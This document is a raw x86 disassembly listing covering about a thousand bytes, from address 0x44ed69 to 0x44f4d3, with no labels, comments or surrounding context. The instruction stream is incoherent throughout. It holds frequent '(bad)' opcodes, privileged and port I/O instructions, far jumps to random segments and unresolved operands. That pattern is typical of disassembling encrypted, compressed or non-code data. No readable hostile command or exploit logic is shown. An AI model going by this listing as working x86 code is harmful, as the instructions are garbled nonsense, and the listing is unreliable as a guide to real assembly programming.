  44ed69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ed6a:	xchg   esi,eax
  44ed6b:	in     eax,dx
  44ed6c:	ja     0x44ed41
  44ed6e:	xor    DWORD PTR [ecx-0x7813b66f],0x43
  44ed75:	push   cs
  44ed76:	cdq    
  44ed77:	xor    eax,0xe4bfe6c7
  44ed7c:	(bad)  
  44ed7d:	sub    dh,BYTE PTR [ecx+0x5f]
  44ed80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ed81:	(bad)  
  44ed82:	xchg   esp,eax
  44ed83:	mov    eax,0xcb53b51f
  44ed88:	popf   
  44ed89:	mov    fs:0xd7392d7f,eax
  44ed8f:	ror    DWORD PTR [edx-0x14],cl
  44ed92:	fisttp QWORD PTR [edx]
  44ed94:	push   ds
  44ed95:	mov    al,0x23
  44ed97:	cld    
  44ed98:	popf   
  44ed99:	mov    eax,ds:0x847085fb
  44ed9e:	ins    DWORD PTR es:[edi],dx
  44ed9f:	js     0x44ede9
  44eda1:	cli    
  44eda2:	mov    dl,0x20
  44eda4:	mov    fs,WORD PTR [edx]
  44eda6:	mov    edi,0xf4a88154
  44edab:	xchg   esi,eax
  44edac:	cmc    
  44edad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44edae:	push   ebp
  44edaf:	lock in al,0x49
  44edb2:	pop    esp
  44edb3:	add    DWORD PTR [ebx],ebx
  44edb5:	jmp    0xd43ae8d9
  44edba:	jle    0x44ed62
  44edbc:	lds    ebp,FWORD PTR ds:0x4a2c55ec
  44edc2:	xor    DWORD PTR [edi],eax
  44edc4:	js     0x44ed5f
  44edc6:	mov    eax,0x10c91adc
  44edcb:	adc    bh,BYTE PTR [edx-0x75d6f5fd]
  44edd1:	int    0x5b
  44edd3:	sbb    eax,0x5c454272
  44edd8:	jecxz  0x44edf4
  44edda:	push   0x7e
  44eddc:	xchg   edx,eax
  44eddd:	xor    DWORD PTR [ebp-0x1715e663],ebp
  44ede3:	shl    BYTE PTR [ebx],cl
  44ede5:	aad    0xdb
  44ede7:	outs   dx,BYTE PTR ds:[esi]
  44ede8:	jmp    0x1961:0xaa9cb4ef
  44edef:	into   
  44edf0:	loop   0x44edd3
  44edf2:	jmp    0xf9c12de3
  44edf7:	je     0x44ee10
  44edf9:	test   ebp,esi
  44edfb:	shl    DWORD PTR [ebp-0x66],1
  44edfe:	pop    ebx
  44edff:	(bad)  ds:0xb2320665
  44ee05:	mov    dl,BYTE PTR [ecx]
  44ee07:	cmp    BYTE PTR [ecx-0x5a7a964f],0x6
  44ee0e:	nop
  44ee0f:	icebp  
  44ee10:	pop    ebx
  44ee11:	gs std 
  44ee13:	bound  edx,QWORD PTR [ecx]
  44ee15:	test   al,0x1f
  44ee17:	sub    ah,BYTE PTR [esi+0x4c]
  44ee1a:	or     eax,0xe7804f63
  44ee1f:	data16 stc 
  44ee21:	das    
  44ee22:	mov    ah,0x4
  44ee24:	mov    esp,0x35b170d6
  44ee29:	push   esp
  44ee2a:	stos   DWORD PTR es:[edi],eax
  44ee2b:	jmp    0xea8aba0b
  44ee30:	pop    ss
  44ee31:	leave  
  44ee32:	jae    0x44edb7
  44ee34:	(bad)  
  44ee35:	pushf  
  44ee36:	inc    edx
  44ee37:	rcl    cl,cl
  44ee39:	cdq    
  44ee3a:	sti    
  44ee3b:	ins    DWORD PTR es:[edi],dx
  44ee3c:	std    
  44ee3d:	ficomp DWORD PTR [edi+edi*2-0x149a643e]
  44ee44:	loope  0x44edea
  44ee46:	push   ebx
  44ee47:	enter  0x851,0x41
  44ee4b:	es enter 0x131a,0x5
  44ee50:	add    eax,0x5df1c362
  44ee55:	shl    ebp,1
  44ee57:	adc    DWORD PTR ds:0x1cf68fa,0x4bd2f99a
  44ee61:	lea    ecx,[edx]
  44ee63:	outs   dx,BYTE PTR ds:[esi]
  44ee64:	outs   dx,BYTE PTR gs:[esi]
  44ee66:	pop    esi
  44ee67:	in     al,dx
  44ee68:	imul   ecx,DWORD PTR [ecx+0x61],0x3c91f5d
  44ee6f:	lods   al,BYTE PTR ds:[esi]
  44ee70:	xor    dl,0x51
  44ee73:	adc    DWORD PTR [edx+0x27],esp
  44ee76:	arpl   WORD PTR [ebx-0x5b],bp
  44ee79:	bound  esp,QWORD PTR [ecx-0x11]
  44ee7c:	(bad)  
  44ee7d:	in     al,dx
  44ee7e:	cmp    dl,BYTE PTR [edi-0x6dca56e3]
  44ee84:	std    
  44ee85:	call   DWORD PTR [edi-0x3]
  44ee88:	cmp    BYTE PTR [edx+0x2f],ch
  44ee8b:	xor    DWORD PTR [ecx+edi*4],ebx
  44ee8e:	fucom  st(0)
  44ee90:	add    DWORD PTR [edi+ebx*8-0x52],edx
  44ee94:	imul   BYTE PTR [ecx]
  44ee96:	call   0x9ff44102
  44ee9b:	push   0x68
  44ee9d:	arpl   WORD PTR [ebx+0x7724465c],bx
  44eea3:	xchg   ebx,eax
  44eea4:	mov    ch,0x8a
  44eea6:	push   cs
  44eea7:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44eea9:	push   eax
  44eeaa:	pop    ds
  44eeab:	push   0xffffffbe
  44eead:	in     al,dx
  44eeae:	push   ecx
  44eeaf:	lods   eax,DWORD PTR ds:[esi]
  44eeb0:	mov    ebp,0x4de80f40
  44eeb5:	rol    DWORD PTR [edx+0xc],cl
  44eeb8:	cmc    
  44eeb9:	jns    0x44ee7e
  44eebb:	call   0xe982b553
  44eec0:	push   ds
  44eec1:	dec    ecx
  44eec2:	pushf  
  44eec3:	adc    BYTE PTR [edx],0x94
  44eec6:	jg     0x44ee6c
  44eec8:	sub    bh,BYTE PTR [eax+0x1cf8bcfb]
  44eece:	jmp    0x1be9:0x37a120c9
  44eed5:	leave  
  44eed6:	adc    eax,0x44d03340
  44eedb:	(bad)  
  44eedc:	and    eax,0x1c615b9e
  44eee1:	ja     0x44ef3d
  44eee3:	sbb    BYTE PTR [ebx-0x599da476],cl
  44eee9:	xor    BYTE PTR [esi+0xeeb2994],0xa4
  44eef0:	xchg   ebp,eax
  44eef1:	jae    0x44eeb4
  44eef3:	icebp  
  44eef4:	ficom  WORD PTR [ebx]
  44eef6:	rol    DWORD PTR [ebp+0x1b],0x99
  44eefa:	dec    edx
  44eefb:	inc    ecx
  44eefc:	mov    DWORD PTR [edi+0x20],ebx
  44eeff:	loopne 0x44ef04
  44ef01:	sahf   
  44ef02:	cmp    eax,DWORD PTR [ebx+0x11]
  44ef05:	dec    ebx
  44ef06:	cwde   
  44ef07:	push   0x3782b174
  44ef0c:	mov    al,ds:0xc94b9e1
  44ef11:	jmp    0x6815:0xb4c72cad
  44ef18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ef19:	clc    
  44ef1a:	cmp    al,0xca
  44ef1c:	adc    ebp,0xffffffbb
  44ef1f:	mov    ah,0xae
  44ef21:	cmp    al,0x15
  44ef23:	dec    esi
  44ef24:	es jl  0x44ef46
  44ef27:	mov    edx,fs
  44ef29:	test   al,0xcb
  44ef2b:	ins    BYTE PTR es:[edi],dx
  44ef2c:	out    0xf2,al
  44ef2e:	imul   ebp,DWORD PTR [ebx+0x22],0xffffffb9
  44ef32:	sbb    BYTE PTR [edx],0x51
  44ef35:	mov    al,ds:0x995e15e3
  44ef3a:	sbb    ecx,DWORD PTR [ebp-0x2d77380d]
  44ef40:	pop    ss
  44ef41:	mov    ah,0xdc
  44ef43:	fild   DWORD PTR [ebp-0x7b]
  44ef46:	mov    bl,0xf4
  44ef48:	std    
  44ef49:	clc    
  44ef4a:	cmp    al,0xa6
  44ef4c:	out    0x60,al
  44ef4e:	sbb    esi,eax
  44ef50:	pop    ds
  44ef51:	retf   
  44ef52:	mov    ds:0x7cb842a1,al
  44ef57:	or     eax,edx
  44ef59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ef5a:	mov    esi,0xed4b5af4
  44ef5f:	dec    eax
  44ef60:	jne    0x44efb1
  44ef62:	sub    edx,0x7629d957
  44ef68:	push   ss
  44ef69:	pop    ecx
  44ef6a:	dec    ebp
  44ef6b:	or     bh,ch
  44ef6d:	arpl   WORD PTR [esi-0x3e],dx
  44ef70:	pop    eax
  44ef71:	lahf   
  44ef72:	sub    eax,eax
  44ef74:	push   cs
  44ef75:	mov    al,ds:0xca34d128
  44ef7a:	pop    ecx
  44ef7b:	aam    0x16
  44ef7d:	push   0xffffffb7
  44ef7f:	je     0x44ef6f
  44ef81:	dec    edx
  44ef82:	add    eax,DWORD PTR ds:0xea338d15
  44ef88:	jno    0x44ef1f
  44ef8a:	out    0xc9,al
  44ef8c:	and    eax,0x76bc109
  44ef91:	int3   
  44ef92:	sub    esi,ebp
  44ef94:	mov    dl,0x9c
  44ef96:	jnp    0x44ef8e
  44ef98:	out    dx,eax
  44ef99:	mov    edx,0x55408d94
  44ef9e:	jecxz  0x44efb3
  44efa0:	inc    ebp
  44efa1:	mov    ax,0x1134
  44efa5:	scas   eax,DWORD PTR es:[edi]
  44efa6:	mov    ebx,?
  44efa8:	neg    BYTE PTR [ebx-0x54db2fc2]
  44efae:	mov    eax,0x9cc07bfb
  44efb3:	mov    DWORD PTR [ecx],ebx
  44efb5:	ret    0xc4c3
  44efb8:	xor    al,0x33
  44efba:	jb     0x44ef4f
  44efbc:	iret   
  44efbd:	push   0xffffffff
  44efbf:	loopne 0x44efbf
  44efc1:	shr    BYTE PTR [ebp-0x489b76c3],cl
  44efc7:	lock lods eax,DWORD PTR ds:[esi]
  44efc9:	dec    esi
  44efca:	inc    ecx
  44efcb:	pop    di
  44efcd:	push   esi
  44efce:	jmp    0x89e7ff47
  44efd3:	ins    DWORD PTR es:[edi],dx
  44efd4:	inc    edi
  44efd5:	mov    eax,ds:0xb98df67b
  44efda:	mov    edx,0x83a43bb8
  44efdf:	iret   
  44efe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44efe1:	fdiv   QWORD PTR [esi+0x1a80bf84]
  44efe7:	jmp    0xfad5:0xf030ef05
  44efee:	int3   
  44efef:	mov    ecx,DWORD PTR [ecx-0x463e117]
  44eff5:	pop    ds
  44eff6:	mov    al,ds:0xb3ee0786
  44effb:	cmp    al,0x45
  44effd:	rcl    BYTE PTR [eax-0xe],0x3c
  44f001:	femms  
  44f003:	push   ds
  44f004:	sbb    eax,0x5f8e7b39
  44f009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44f00a:	or     al,0x2c
  44f00c:	dec    ebp
  44f00d:	push   ebp
  44f00e:	pop    esp
  44f00f:	scas   al,BYTE PTR es:[edi]
  44f010:	(bad)  
  44f011:	jmp    0x275ac460
  44f016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f017:	in     eax,0x22
  44f019:	mov    ebx,0x62d6734b
  44f01e:	mov    esi,0x32c98fb4
  44f023:	mov    esp,0x2680c958
  44f028:	xchg   BYTE PTR [esi+ebp*2],dl
  44f02b:	arpl   WORD PTR [edi-0x571796c9],bp
  44f031:	fdivr  QWORD PTR [esi+0x1adba669]
  44f037:	adc    al,0xa5
  44f039:	and    al,0x9
  44f03b:	mov    cl,0x56
  44f03d:	mov    ch,0x8b
  44f03f:	add    bl,BYTE PTR [ebx+0x654a6e66]
  44f045:	fwait
  44f046:	xchg   ebp,eax
  44f047:	imul   si,WORD PTR [esp+edi*4+0x14],0x68
  44f04d:	mov    BYTE PTR [edx+0x5a73855d],bh
  44f053:	clc    
  44f054:	bound  ebx,QWORD PTR [ebx+edx*4+0x38]
  44f058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f059:	push   edi
  44f05a:	or     bl,ch
  44f05c:	xchg   esi,eax
  44f05d:	inc    edx
  44f05e:	adc    bh,BYTE PTR [eax-0x2b424271]
  44f064:	call   0x85809637
  44f069:	outs   dx,DWORD PTR ds:[esi]
  44f06a:	jnp    0x44f062
  44f06c:	aam    0x7a
  44f06e:	sbb    ebp,0xc
  44f071:	js     0x44f01d
  44f073:	out    dx,eax
  44f074:	mov    BYTE PTR [edi-0x4a],ah
  44f077:	fs sti 
  44f079:	sub    eax,0x66852da4
  44f07e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f07f:	hlt    
  44f080:	jp     0x44f02e
  44f082:	hlt    
  44f083:	pop    edi
  44f084:	cs cdq 
  44f086:	mov    al,0x13
  44f088:	dec    eax
  44f089:	enter  0x2b64,0xde
  44f08d:	aaa    
  44f08e:	or     BYTE PTR [edi],ah
  44f090:	adc    eax,0x37e5d140
  44f095:	mov    WORD PTR ds:[eax],es
  44f098:	and    al,0x19
  44f09a:	ins    BYTE PTR es:[edi],dx
  44f09b:	ins    DWORD PTR es:[edi],dx
  44f09c:	push   ebx
  44f09d:	arpl   WORD PTR [edx],ax
  44f09f:	jp     0x44f085
  44f0a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44f0a2:	imul   ecx,DWORD PTR [edx+0x4f],0xffffffe1
  44f0a6:	push   esi
  44f0a7:	ss dec ecx
  44f0a9:	push   0xffffffdd
  44f0ab:	aad    0x9a
  44f0ad:	xchg   BYTE PTR [ecx],ah
  44f0af:	push   ebp
  44f0b0:	pop    ss
  44f0b1:	inc    ecx
  44f0b2:	aam    0x37
  44f0b4:	jbe    0x44f05a
  44f0b6:	fwait
  44f0b7:	pop    esp
  44f0b8:	lods   al,BYTE PTR ds:[esi]
  44f0b9:	imul   ebx,DWORD PTR [edi],0xfffffff6
  44f0bc:	xor    DWORD PTR [esp+eiz*4+0x42],ebp
  44f0c0:	sbb    ecx,DWORD PTR [ecx-0xe1b444d]
  44f0c6:	sahf   
  44f0c7:	push   ds
  44f0c8:	push   es
  44f0c9:	popf   
  44f0ca:	stos   DWORD PTR es:[edi],eax
  44f0cb:	cmp    DWORD PTR [esi+0x11],esp
  44f0ce:	mov    eax,ds:0x276941df
  44f0d3:	sub    eax,0xbc68f98e
  44f0d8:	inc    ebx
  44f0d9:	sbb    eax,0xe84c9772
  44f0de:	mov    bl,0xbc
  44f0e0:	and    eax,0xbe4eced
  44f0e5:	scas   eax,DWORD PTR es:[edi]
  44f0e6:	xor    ah,al
  44f0e8:	and    eax,0xfe8e3909
  44f0ed:	cmp    BYTE PTR [eax+0x17],ah
  44f0f0:	xor    eax,0x2449eb9b
  44f0f5:	je     0x44f114
  44f0f7:	jg     0x44f0ef
  44f0f9:	add    eax,0x6b037faf
  44f0fe:	mov    ecx,0x13d1e42
  44f103:	fs push ebx
  44f105:	dec    edi
  44f106:	jp     0x44f0e5
  44f108:	xchg   ebp,eax
  44f109:	push   ss
  44f10a:	ret    0x8ef1
  44f10d:	les    eax,FWORD PTR [edi]
  44f10f:	stc    
  44f110:	xchg   esi,eax
  44f111:	sahf   
  44f112:	jb     0x44f0d2
  44f114:	sbb    eax,0x59dc4889
  44f119:	and    ch,BYTE PTR [eax-0x10]
  44f11c:	adc    al,0x9a
  44f11e:	imul   ecx,DWORD PTR [ecx],0xfffffff7
  44f121:	xor    DWORD PTR [edx+0x30],0xfffffff6
  44f125:	pop    edx
  44f126:	popa   
  44f127:	(bad)  
  44f128:	hlt    
  44f129:	(bad)  
  44f12a:	mov    ebp,0x47a26824
  44f12f:	je     0x44f196
  44f131:	in     al,0x74
  44f133:	icebp  
  44f134:	cld    
  44f135:	adc    eax,0xe73b58
  44f13a:	mov    esp,0x91979d2c
  44f13f:	push   ss
  44f140:	or     DWORD PTR ds:0x89a04cc,0xb62537bd
  44f14a:	lock jmp 0x44f1cc
  44f14d:	out    0xc,eax
  44f14f:	popa   
  44f150:	and    BYTE PTR [ecx+0x282e3484],bh
  44f156:	push   ds
  44f157:	dec    ecx
  44f158:	adc    ah,dl
  44f15a:	dec    esp
  44f15b:	add    BYTE PTR [ecx],bl
  44f15d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f15e:	jmp    0x44f155
  44f160:	add    ah,cl
  44f162:	mov    edi,0xaa8a0d70
  44f167:	cmp    al,0x1e
  44f169:	or     bh,BYTE PTR [esi]
  44f16b:	rol    DWORD PTR [edi-0x4f],1
  44f16e:	sbb    BYTE PTR [edx-0x16b37ff1],bh
  44f174:	in     eax,0x87
  44f176:	ins    DWORD PTR es:[edi],dx
  44f177:	out    0x5d,eax
  44f179:	cli    
  44f17a:	(bad)  
  44f17b:	push   cs
  44f17c:	and    ch,cl
  44f17e:	clc    
  44f17f:	outs   dx,BYTE PTR ds:[esi]
  44f180:	stos   BYTE PTR es:[edi],al
  44f181:	test   BYTE PTR [ecx-0xd],ch
  44f184:	sahf   
  44f185:	lahf   
  44f186:	fwait
  44f187:	dec    ebx
  44f188:	dec    esp
  44f189:	add    eax,0xc86ee932
  44f18e:	sbb    al,0x8e
  44f190:	mov    dh,0x9c
  44f192:	jg     0x44f207
  44f194:	sub    eax,0x14f025f2
  44f199:	and    ch,BYTE PTR [ebp-0x6c0a88ce]
  44f19f:	dec    esp
  44f1a0:	in     eax,0xd4
  44f1a2:	arpl   si,bp
  44f1a4:	out    0xd1,al
  44f1a6:	push   ds
  44f1a7:	popf   
  44f1a8:	and    ch,BYTE PTR [ecx+0x5b]
  44f1ab:	fdiv   QWORD PTR [ecx-0xd56881b]
  44f1b1:	xor    al,0x8c
  44f1b3:	sbb    al,0xce
  44f1b5:	(bad)  [eax+edi*2+0x7a9c7925]
  44f1bc:	mov    ecx,esp
  44f1be:	xchg   ecx,eax
  44f1bf:	sub    dh,BYTE PTR [ebp+0x34f0a22b]
  44f1c5:	outs   dx,BYTE PTR ds:[esi]
  44f1c6:	mov    ecx,esp
  44f1c8:	loopne 0x44f165
  44f1ca:	dec    esp
  44f1cb:	data16 sbb al,0x9
  44f1ce:	push   0xfffffff8
  44f1d0:	aad    0x74
  44f1d2:	add    BYTE PTR [esi],0x25
  44f1d5:	lds    ebx,FWORD PTR [ebp-0x6c09917]
  44f1db:	dec    esp
  44f1dc:	pop    ds
  44f1dd:	jns    0x44f1ea
  44f1df:	in     al,0x44
  44f1e1:	dec    ecx
  44f1e2:	fld    TBYTE PTR [ebp+0xf7ba6ec]
  44f1e8:	sti    
  44f1e9:	shl    edi,1
  44f1eb:	jp     0x44f1db
  44f1ed:	stc    
  44f1ee:	adc    al,0xda
  44f1f0:	add    DWORD PTR ds:0x4a014ba,edi
  44f1f6:	retf   
  44f1f7:	(bad)  
  44f1f8:	aad    0x63
  44f1fa:	sub    esp,esi
  44f1fc:	nop
  44f1fd:	xchg   ecx,eax
  44f1fe:	dec    ebx
  44f1ff:	adc    BYTE PTR [ebx+0x3871e3e9],0xe
  44f206:	ins    BYTE PTR es:[edi],dx
  44f207:	ja     0x44f19c
  44f209:	clc    
  44f20a:	int3   
  44f20b:	out    0x79,eax
  44f20d:	lahf   
  44f20e:	jnp    0x44f1e4
  44f210:	inc    eax
  44f211:	ficomp DWORD PTR [ebx+edi*8-0x64]
  44f215:	test   BYTE PTR [ebx-0x695c7329],ch
  44f21b:	add    eax,0xf1b3169b
  44f220:	cmp    esp,DWORD PTR [ecx+0x5f3171ab]
  44f226:	(bad)  
  44f227:	jge    0x44f1d1
  44f229:	xchg   esi,eax
  44f22a:	xor    cl,BYTE PTR [esi-0x5f]
  44f22d:	mov    DWORD PTR [esi],esp
  44f22f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f230:	sbb    al,0x10
  44f232:	cli    
  44f233:	push   es
  44f234:	add    al,0xcd
  44f236:	stos   DWORD PTR es:[edi],eax
  44f237:	in     al,0x57
  44f239:	jo     0x44f21b
  44f23b:	mov    ecx,0x1c28d31f
  44f240:	push   edi
  44f241:	pop    eax
  44f242:	or     ch,BYTE PTR [eax-0x74]
  44f245:	sar    DWORD PTR [edi+0x3204bc34],cl
  44f24b:	adc    esi,DWORD PTR [ebx+ecx*8]
  44f24e:	sti    
  44f24f:	xchg   ecx,eax
  44f250:	popf   
  44f251:	cwde   
  44f252:	push   ss
  44f253:	mov    cl,0x97
  44f255:	xchg   edx,eax
  44f256:	jo     0x44f2c6
  44f258:	(bad)  
  44f259:	or     eax,0xe09d094f
  44f25e:	sbb    eax,0xb7d138e3
  44f263:	(bad)  
  44f264:	jmp    0x44f1f8
  44f266:	push   edx
  44f267:	xchg   ebx,eax
  44f268:	add    eax,0xc3f01a6d
  44f26d:	fild   QWORD PTR [edx-0x2a4f2379]
  44f273:	jo     0x44f295
  44f275:	pop    ecx
  44f276:	mov    WORD PTR [esp+eax*4+0x46],?
  44f27a:	dec    ebp
  44f27b:	cld    
  44f27c:	popf   
  44f27d:	xchg   esi,eax
  44f27e:	(bad)  
  44f27f:	push   ebp
  44f280:	add    BYTE PTR [edi],al
  44f282:	pop    ebx
  44f283:	xchg   esp,eax
  44f284:	fldenv [ecx-0x5aa42342]
  44f28a:	sbb    esi,eax
  44f28c:	sbb    eax,0xda41a088
  44f291:	aas    
  44f292:	sbb    BYTE PTR [edi+ebp*2],dl
  44f295:	mov    dh,0xb2
  44f297:	test   BYTE PTR [ecx-0x59],ch
  44f29a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44f29b:	pop    esi
  44f29c:	stc    
  44f29d:	(bad)  
  44f29e:	scas   eax,DWORD PTR es:[edi]
  44f29f:	jnp    0x44f29f
  44f2a1:	loopne 0x44f25e
  44f2a3:	inc    esp
  44f2a4:	repnz xor dh,BYTE PTR [ecx-0x72]
  44f2a8:	(bad)  
  44f2a9:	leave  
  44f2aa:	mov    al,0x54
  44f2ac:	adc    dl,BYTE PTR [edx-0x67]
  44f2af:	or     eax,0xf18712b5
  44f2b4:	cdq    
  44f2b5:	lea    eax,[edx-0x18d5f237]
  44f2bb:	or     BYTE PTR [edx-0x44ca2376],dh
  44f2c1:	int    0x26
  44f2c3:	repz aas 
  44f2c5:	mov    ds:0xd810814b,al
  44f2ca:	iret   
  44f2cb:	inc    ecx
  44f2cc:	jb     0x44f2b4
  44f2ce:	mov    BYTE PTR [edx],0x20
  44f2d1:	test   eax,0x184e6c9c
  44f2d6:	dec    ebp
  44f2d7:	out    0xb9,al
  44f2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f2da:	jnp    0x44f2f1
  44f2dc:	add    bh,BYTE PTR [esp+edx*4-0x80]
  44f2e0:	sahf   
  44f2e1:	cmc    
  44f2e2:	jl     0x44f313
  44f2e4:	and    bl,BYTE PTR [ecx]
  44f2e6:	jnp    0x44f31c
  44f2e8:	in     al,dx
  44f2e9:	in     eax,0x65
  44f2eb:	ins    BYTE PTR es:[edi],dx
  44f2ec:	mov    esi,0x7240b9c
  44f2f1:	mov    dl,0xc8
  44f2f3:	sub    edi,DWORD PTR [edx-0x5]
  44f2f6:	and    al,ah
  44f2f8:	lea    ebx,[esi+0x4581f4b4]
  44f2fe:	sub    ch,al
  44f300:	cmp    al,0xa8
  44f302:	fwait
  44f303:	jmp    0xa8f2:0x6553224c
  44f30a:	push   es
  44f30b:	jp     0x44f342
  44f30d:	fwait
  44f30e:	shl    DWORD PTR [ecx+edi*1-0x428fde45],0x33
  44f316:	jae    0x44f29b
  44f318:	xchg   esi,eax
  44f319:	mov    ch,0xf3
  44f31b:	and    ah,dh
  44f31d:	cmp    bl,BYTE PTR fs:[esi-0x35]
  44f321:	pop    edx
  44f322:	mov    bl,0xce
  44f324:	test   eax,0xe9e4bcf5
  44f329:	jo     0x44f2d8
  44f32b:	xchg   DWORD PTR [ebp+0x3bee9965],esi
  44f331:	lea    edx,[edx-0x3e]
  44f334:	dec    eax
  44f335:	imul   eax,esp,0x26abf42
  44f33b:	shl    BYTE PTR [eax-0x7b0bd1bd],0xa1
  44f342:	retf   
  44f343:	and    al,0x22
  44f345:	es sub eax,0xab3cd8af
  44f34b:	js     0x44f2e7
  44f34d:	test   al,0xb0
  44f34f:	inc    esp
  44f350:	adc    edi,esi
  44f352:	in     al,0x82
  44f354:	mov    cs:0xc7e3f18b,al
  44f35a:	sub    BYTE PTR [esi-0x52],cl
  44f35d:	mov    edi,0x7e750f00
  44f362:	rcl    DWORD PTR ds:0x4b2832d,1
  44f368:	mov    ds:0x1aebeba7,eax
  44f36d:	jge    0x44f3db
  44f36f:	fistp  WORD PTR [ebp+0x5f84c1a6]
  44f375:	inc    edi
  44f376:	mov    cl,0x44
  44f378:	icebp  
  44f379:	cdq    
  44f37a:	fldenv [ebp+0x35]
  44f37d:	ss (bad) 
  44f37f:	out    0xa0,eax
  44f381:	push   0x29b02e8c
  44f386:	call   0x38d4:0xaba36dd5
  44f38d:	and    eax,0xbe259b7c
  44f392:	pushf  
  44f393:	jmp    0x44f3f4
  44f395:	stc    
  44f396:	loop   0x44f3f9
  44f398:	and    al,0x8
  44f39a:	addr16 xchg esp,eax
  44f39c:	dec    ebp
  44f39d:	outs   dx,BYTE PTR ds:[esi]
  44f39e:	in     al,0x64
  44f3a0:	sbb    ch,BYTE PTR [eax+0x3d8debcb]
  44f3a6:	adc    al,0x7c
  44f3a8:	inc    esp
  44f3a9:	cwde   
  44f3aa:	ja     0x44f32e
  44f3ac:	lahf   
  44f3ad:	inc    ebp
  44f3ae:	mov    bh,0x44
  44f3b0:	in     eax,dx
  44f3b1:	xor    eax,0xe7f6dc3c
  44f3b6:	jl     0x44f37d
  44f3b8:	sbb    al,0x37
  44f3ba:	dec    ecx
  44f3bb:	dec    esp
  44f3bc:	pop    ebp
  44f3bd:	ss mov eax,0xba3de5ed
  44f3c3:	les    ebp,FWORD PTR [ebx+0x1d]
  44f3c6:	in     al,dx
  44f3c7:	sub    ah,BYTE PTR [ebp-0x25165efe]
  44f3cd:	sbb    ecx,0x36e71b59
  44f3d3:	retf   
  44f3d4:	cmp    eax,0xb194bf89
  44f3d9:	xchg   ebx,eax
  44f3da:	in     al,0x34
  44f3dc:	xor    eax,0x2bec43e2
  44f3e1:	add    DWORD PTR [edi],edi
  44f3e3:	pushf  
  44f3e4:	(bad)  
  44f3e6:	sbb    eax,0x94b6fb1b
  44f3eb:	inc    ebp
  44f3ec:	rcr    BYTE PTR [ecx+esi*4-0x41cb151e],1
  44f3f3:	dec    edx
  44f3f4:	mov    ah,0xa1
  44f3f6:	stos   DWORD PTR es:[edi],eax
  44f3f7:	xchg   edx,eax
  44f3f8:	clc    
  44f3f9:	sbb    edx,ecx
  44f3fb:	xor    al,0x6e
  44f3fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f3fe:	mov    ds:0x239a7537,al
  44f403:	adc    eax,0x5ae7dd22
  44f408:	sbb    eax,0x2d051ba4
  44f40d:	mov    ah,BYTE PTR [ecx+edi*4]
  44f410:	xchg   esi,eax
  44f411:	lahf   
  44f412:	sub    DWORD PTR [ebp-0x65c3eaa7],ebx
  44f418:	adc    eax,0x890842e7
  44f41d:	stos   BYTE PTR es:[edi],al
  44f41e:	int3   
  44f41f:	inc    ebp
  44f420:	inc    ecx
  44f421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f422:	sti    
  44f423:	rcl    BYTE PTR [ecx+0x177132ac],0x30
  44f42a:	int3   
  44f42b:	dec    edi
  44f42c:	fstp   QWORD PTR [edi]
  44f42e:	mov    ch,0x14
  44f430:	jmp    DWORD PTR [esi+0x2c]
  44f433:	cdq    
  44f434:	cmc    
  44f435:	lahf   
  44f436:	repz icebp 
  44f438:	sub    DWORD PTR [edi+0x196861a2],0xa4a09678
  44f442:	sbb    BYTE PTR [edi-0xfaa8c1b],dl
  44f448:	scas   al,BYTE PTR es:[edi]
  44f449:	int3   
  44f44a:	sbb    edx,DWORD PTR [edx+0x24b0caf1]
  44f450:	ret    
  44f451:	stos   BYTE PTR es:[edi],al
  44f452:	push   esi
  44f453:	xor    BYTE PTR [ebp+0x63],ah
  44f456:	ins    BYTE PTR es:[edi],dx
  44f457:	hlt    
  44f458:	fwait
  44f459:	fwait
  44f45a:	into   
  44f45b:	inc    edx
  44f45c:	push   ss
  44f45d:	jns    0x44f4da
  44f45f:	ins    DWORD PTR es:[edi],dx
  44f460:	push   edi
  44f461:	test   eax,0x737fd5b3
  44f466:	dec    edi
  44f467:	xor    DWORD PTR [ebx+edx*2],ecx
  44f46a:	xlat   BYTE PTR ds:[ebx]
  44f46b:	ins    DWORD PTR es:[edi],dx
  44f46c:	sub    eax,0xd7eac638
  44f471:	call   0xf833:0xce7c76ec
  44f478:	popa   
  44f479:	(bad)  
  44f47a:	and    al,0xc4
  44f47c:	xchg   esp,eax
  44f47d:	je     0x44f483
  44f47f:	fstp   QWORD PTR [ecx]
  44f481:	call   0xa04168b2
  44f486:	fcmovnu st,st(4)
  44f488:	retf   0x6b2f
  44f48b:	pop    es
  44f48c:	shl    BYTE PTR [ecx-0x67],1
  44f48f:	pop    ss
  44f490:	and    ch,BYTE PTR [ecx-0x2c]
  44f493:	inc    edx
  44f494:	jg     0x44f44f
  44f496:	in     al,0x8c
  44f498:	mov    esp,0xa56ffba7
  44f49d:	xchg   esi,eax
  44f49e:	in     eax,dx
  44f49f:	xor    al,0xf4
  44f4a1:	enter  0xb25c,0xee
  44f4a5:	sub    eax,0xa843a89c
  44f4aa:	and    ebx,DWORD PTR [esi+0x47914621]
  44f4b0:	mov    dh,0xb5
  44f4b2:	push   es
  44f4b3:	pop    edi
  44f4b4:	aaa    
  44f4b5:	sahf   
  44f4b6:	ds das 
  44f4b8:	std    
  44f4b9:	dec    esp
  44f4ba:	in     eax,dx
  44f4bb:	xor    al,0xf3
  44f4bd:	cmp    DWORD PTR [esp+eiz*2-0x24483d4d],0xe6cb0e65
  44f4c8:	mov    db4,edx
  44f4cb:	adc    BYTE PTR [ecx],ah
  44f4cd:	mov    ecx,0xe9da3073
  44f4d2:	cmc    
  44f4d3:	mov    ebp,0x433b9b78
